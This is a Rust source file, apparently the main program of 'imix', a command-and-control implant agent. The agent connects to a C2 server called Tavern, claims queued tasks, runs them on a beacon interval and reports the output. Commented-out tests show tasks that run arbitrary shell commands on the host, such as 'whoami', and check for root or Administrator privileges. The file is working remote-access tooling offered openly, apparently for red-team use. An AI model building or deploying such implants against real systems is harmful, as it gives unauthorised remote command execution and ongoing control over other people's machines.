use anyhow::Result;
use c2::pb::c2_client::C2Client;
use c2::pb::TaskOutput;

use chrono::Utc;
use clap::{arg, Command};
use imix::exec::{handle_output_and_responses, AsyncTask};
use imix::init::agent_init;
use imix::tasks::start_new_tasks;
use imix::{tasks, Config};
use std::collections::HashMap;
use std::time::Instant;

fn get_callback_uri(imix_config: Config) -> Result<String> {
    Ok(imix_config.callback_config.c2_configs[0].uri.clone())
}

// Async handler for port scanning.
async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
    #[cfg(debug_assertions)]
    let mut debug_loop_count: i32 = 0;

    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
    // AKA Work queue
    let mut all_exec_futures: HashMap<i32, AsyncTask> = HashMap::new();
    // This hashmap tracks all tasks output
    // AKA Results queue
    let mut all_task_res_map: HashMap<i32, Vec<TaskOutput>> = HashMap::new();

    let (agent_properties, imix_config) = agent_init(config_path)?;

    loop {
        // @TODO: Why two timers?
        let debug_start_time = Utc::now().time();

        // 0. Get loop start time
        let loop_start_time = Instant::now();

        #[cfg(debug_assertions)]
        eprintln!("Get new tasks");

        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = get_callback_uri(imix_config.clone())?;

        // 1b) Setup the tavern client
        let tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
            Ok(tavern_client_local) => tavern_client_local,
            Err(err) => {
                #[cfg(debug_assertions)]
                eprintln!("failed to create tavern client {}", err);
                continue;
            }
        };

        // 1c) Collect new tasks
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: collecting tasks",
            (Utc::now().time() - debug_start_time).num_milliseconds()
        );

        let new_tasks = tasks::get_new_tasks(
            agent_properties.clone(),
            imix_config.clone(),
            tavern_client.clone(),
        )
        .await?;

        // 2. Start new tasks
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Starting {} new tasks",
            (Utc::now().time() - debug_start_time).num_milliseconds(),
            new_tasks.len()
        );

        start_new_tasks(new_tasks, &mut all_exec_futures, debug_start_time).await?;

        // 3. Sleep till callback time
        let time_to_sleep = imix_config
            .clone()
            .callback_config
            .interval
            .checked_sub(loop_start_time.elapsed().as_secs())
            .unwrap_or_else(|| 0);

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Sleeping seconds {}",
            (Utc::now().time() - debug_start_time).num_milliseconds(),
            time_to_sleep
        );

        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.

        // Check status & send response
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Checking task status",
            (Utc::now().time() - debug_start_time).num_milliseconds()
        );

        // Update running tasks and results
        handle_output_and_responses(
            debug_start_time,
            tavern_client,
            &mut all_exec_futures,
            &mut all_task_res_map,
        )
        .await?;

        // Debug loop tracker
        #[cfg(debug_assertions)]
        if let Some(count_max) = loop_count_max {
            debug_loop_count += 1;
            if debug_loop_count >= count_max {
                return Ok(());
            }
        }
    }
}

pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false),
        )
        .subcommand(
            Command::new("install").about("Run in install mode").arg(
                arg!(
                    -c --config <FILE> "Sets a custom config file"
                )
                .required(true),
            ),
        )
        .get_matches();

    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(128)
        .enable_all()
        .build()
        .unwrap();

    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            unimplemented!("Install isn't implemented yet")
        }
        _ => {}
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string(), None)) {
            Ok(_) => {}
            Err(error) => eprintln!(
                "Imix main_loop exited unexpectedly with config: {}\n{}",
                config_path.to_string(),
                error
            ),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use c2::pb::ClaimTasksResponse;

    #[test]
    fn imix_handle_exec_tome() {}

    //     #[test]
    //     fn imix_handle_exec_tome() {
    //         let test_tome_input = Task {
    //             id: "17179869185".to_string(),
    //             quest: Quest {
    //                 id: "4294967297".to_string(),
    //                 name: "Test Exec".to_string(),
    //                 parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
    //                 tome: Tome {
    //                     id: "21474836482".to_string(),
    //                     name: "Shell execute".to_string(),
    //                     description: "Execute a command in the default system shell".to_string(),
    //                     eldritch: r#"
    // print("custom_print_handler_test")
    // sys.shell(input_params["cmd"])["stdout"]
    // "#
    //                     .to_string(),
    //                     files: None,
    //                     param_defs: Some(r#"{"params":[{"name":"cmd","type":"string"}]}"#.to_string()),
    //                 },
    //                 bundle: None,
    //             },
    //         };

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let (sender, receiver) = channel::<String>();

    //         // Define a future for our execution task
    //         let exec_future = handle_exec_tome(test_tome_input, sender.clone());
    //         let result = runtime.block_on(exec_future).unwrap();

    //         let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
    //         assert_eq!(stdout, "custom_print_handler_test".to_string());

    //         let mut bool_res = false;

    //         if cfg!(target_os = "linux")
    //             || cfg!(target_os = "ios")
    //             || cfg!(target_os = "android")
    //             || cfg!(target_os = "freebsd")
    //             || cfg!(target_os = "openbsd")
    //             || cfg!(target_os = "netbsd")
    //             || cfg!(target_os = "macos")
    //         {
    //             bool_res = result.0 == "runner\n" || result.0 == "root\n";
    //         } else if cfg!(target_os = "windows") {
    //             bool_res = result.0.contains("runneradmin") || result.0.contains("Administrator");
    //         }

    //         assert_eq!(bool_res, true);
    //     }

    //     #[test]
    //     fn imix_test_main_loop_sleep_twice_short() -> Result<()> {
    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();
    //         let test_task_id = "17179869185".to_string();
    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let test_task = Task {
    //             id: test_task_id,
    //             quest: Quest {
    //                 id: "4294967297".to_string(),
    //                 name: "Exec stuff".to_string(),
    //                 parameters: None,
    //                 tome: Tome {
    //                     id: "21474836482".to_string(),
    //                     name: "sys exec".to_string(),
    //                     description: "Execute system things.".to_string(),
    //                     param_defs: None,
    //                     eldritch: r#"
    // def test():
    // if sys.is_macos():
    // sys.shell("sleep 3")
    // if sys.is_linux():
    // sys.shell("sleep 3")
    // if sys.is_windows():
    // sys.shell("timeout 3")
    // test()
    // print("main_loop_test_success")"#
    //                         .to_string(),
    //                     files: None,
    //                 },
    //                 bundle: None,
    //             },
    //         };
    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![test_task.clone(), test_task.clone()],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 0,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         // Define a future for our execution task
    //         let start_time = Utc::now().time();
    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future).unwrap();
    //         let end_time = Utc::now().time();
    //         let diff = (end_time - start_time).num_milliseconds();
    //         assert!(diff < 4500);
    //         Ok(())
    //     }

    //     #[test]
    //     fn imix_test_main_loop_run_once() -> Result<()> {
    //         let test_task_id = "17179869185".to_string();

    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();

    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![Task {
    //                     id: test_task_id.clone(),
    //                     quest: Quest {
    //                         id: "4294967297".to_string(),
    //                         name: "Exec stuff".to_string(),
    //                         parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
    //                         tome: Tome {
    //                             id: "21474836482".to_string(),
    //                             name: "sys exec".to_string(),
    //                             description: "Execute system things.".to_string(),
    //                             param_defs: Some(r#"[{"name":"cmd","type":"string"}]"#.to_string()),
    //                             eldritch: r#"print(sys.shell(input_params["cmd"]))"#.to_string(),
    //                             files: None,
    //                         },
    //                         bundle: None,
    //                     },
    //                 }],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 1,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future)?;
    //         assert!(true);
    //         Ok(())
    //     }
}
